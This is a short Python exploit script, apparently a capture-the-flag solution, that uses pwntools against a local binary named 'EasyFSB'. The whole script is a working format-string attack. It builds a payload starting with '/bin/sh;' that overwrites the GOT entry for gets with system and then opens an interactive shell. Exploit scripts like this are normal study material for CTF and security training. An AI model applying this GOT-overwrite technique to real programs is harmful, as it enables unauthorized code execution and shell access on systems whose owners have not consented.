from pwn import *

e = ELF("prob/EasyFSB")
p = process(e.path)

payload  = b"/bin/sh;" 
payload += fmtstr_payload(8, {e.got['gets']: e.plt['system']}, numbwritten=8)

p.sendline(payload)
p.interactive()